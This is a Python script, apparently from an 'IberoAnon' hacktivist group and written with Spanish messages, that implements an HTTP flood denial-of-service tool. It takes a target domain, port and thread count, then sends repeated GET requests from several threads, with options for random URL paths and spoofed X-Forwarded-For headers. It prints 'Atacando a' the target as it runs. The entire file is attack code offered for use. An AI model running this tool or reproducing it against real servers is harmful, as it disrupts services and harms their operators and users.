import socket
import sys
import threading
import string
import time
import argparse
from os import system, name
import random
from colorama import Fore
argparser = argparse.ArgumentParser()
argparser.add_argument("-d", "--domain", help="IP objetivo o dominio")
argparser.add_argument("-p", "--port", help="Puerto")
argparser.add_argument("-r", "--range", help="Rango de envio")
argparser.add_argument("-t", "--threads", help="Numero de procesos")
argparser.add_argument("--spoof", action="store_true", help="Intentar suplantar IP")
argparser.add_argument("--get-random", action="store_true", help="Generar valores GET randoms")

parser = argparser.parse_args()
dominio = parser.domain
puerto = parser.port
rango = parser.range
procesos = parser.threads
spoof = parser.spoof
random1 = parser.get_random

def logo():
    logo = f"""
    /\                                                      
   /  \   _ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ 
  / /\ \ | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __|
 / ____ \| | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \\
/_/    \_\_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/
                             __/ |                          
                            |___/            
                                               _              
 _____ _                                      ( )     _           
|_   _| |                                     |/     (_)          
  | | | |__   ___ _ __ ___   __ _ _ __ ___   ___ _ __ _  ___ __ _ 
  | | | '_ \ / _ \ '__/ _ \ / _` | '_ ` _ \ / _ \ '__| |/ __/ _` |
 _| |_| |_) |  __/ | | (_) | (_| | | | | | |  __/ |  | | (_| (_| |
|_____|_.__/ \___|_|  \___/ \__,_|_| |_| |_|\___|_|  |_|\___\__,_|@IberoAnon """
    return logo
def prepare():
    if name == "nt":
        _=system("cls")
    else:
        _=system("clear")
    print(logo())
    try:
        if spoof:
            ip_spoof = True
        else:
            ip_spoof = False

        if random1:
            random_get = True
        else:
            random_get = False
        if str(dominio).startswith("https://"):
            clean = str(dominio).replace("https://", "")
            host = clean.replace("/", "")
            ip = str(socket.gethostbyname(host))
        elif str(dominio).startswith("http://"):
            clean = str(dominio).replace("http://", "")
            host = clean.replace("/", "")
            ip = str(socket.gethostbyname(host))
        else:
            host = dominio
            ip = str(socket.gethostbyname(dominio))
        i = 1
        b = 1
        paquetes = 0
        for i in range(int(rango)):
            time.sleep(0.01)
            if int(procesos) <= 10:
                for b in range(int(procesos)):
                    thread = threading.Thread(target=dos, args=(ip, host, puerto, paquetes, ip_spoof, random_get))
                    thread.start()
                    paquetes = paquetes + 1
                    time.sleep(0.01)
                    
            else:
                print("El limite de procesos es 10!")
                break

    except socket.gaierror:
        print(f"no se pudo reconocer el host '{ip}'")
    except IndexError:
        argparser.print_help()
    except TypeError:
        argparser.print_help()
    except KeyboardInterrupt:
        print(str(Fore.RESET) + "El conocimiento es libre")

   
  
def generar_url_direccion():
    msg = str(string.digits + string.hexdigits+ string.octdigits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def generar_ip():
    a = random.randint(1,254)
    b = random.randint(1,254)
    c = random.randint(1,254)
    d = random.randint(1,254)
    ip = f"{a}.{b}.{c}.{d}"
    return ip
    
def dos(ip, host, puerto, paquetes, ip_spoof, get_random):
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    texto = f" Atacando a {ip} en el puerto {puerto}"
    colores = str(Fore.RED) + texto,  str(Fore.GREEN) + texto
    dato = "".join(random.sample(colores, 1))


    try:
        if ip_spoof == True and get_random == True:
            while True:
                servidor.connect((ip, int(puerto)))
                dos = "GET /%s HTTP/1.1\nHost: %s\nX-Forwarded-For: %s\n\n" % (generar_url_direccion(),host, generar_ip())
                dos1 = dos.encode()
                servidor.send(dos1)

                sys.stdout.write(f"\r{dato} | enviados: [{paquetes}]" + Fore.RESET)
                sys.stdout.flush()

                paquetes = paquetes + 1
                time.sleep(0.1)

        elif ip_spoof == True:

            while True:
                servidor.connect((ip, int(puerto)))
                dos = "GET / HTTP/1.1\nHost: %s\nX-Forwarded-For: %s\n\n" % (host, generar_ip())
                dos1 = dos.encode()
                servidor.send(dos1)

                sys.stdout.write(f"\r{dato} | enviados: [{paquetes}]" + Fore.RESET)
                sys.stdout.flush()

                paquetes = paquetes + 1
                time.sleep(0.1)
        elif get_random == True:
            while True:
                servidor.connect((ip, int(puerto)))
                dos = "GET /%s HTTP/1.1\nHost: %s\n\n" % (generar_url_direccion(),host)
                print(dos)
                dos1 = dos.encode()
                servidor.send(dos1)

                sys.stdout.write(f"\r{dato} | enviados: [{paquetes}]" + Fore.RESET)
                sys.stdout.flush()

                paquetes = paquetes + 1
                time.sleep(0.1)
        else:
            while True:
                servidor.connect((ip, int(puerto)))
                dos = "GET / HTTP/1.1\nHost: %s\n\n" % (host)
                dos1 = dos.encode("utf-8")
                servidor.send(dos1)


                sys.stdout.write(f"\r{dato} | enviados: [{paquetes}]" + Fore.RESET)
                sys.stdout.flush()

                paquetes = paquetes + 1
                time.sleep(0.1)
            
    except ConnectionRefusedError:
        sys.stdout.write("\rappears to be down")
        sys.stdout.flush()
    except OSError:
        return 1
    except KeyboardInterrupt:
        print(Fore.RESET + "\nEl conocimiento es libre")

if __name__ == "__main__":
    prepare()
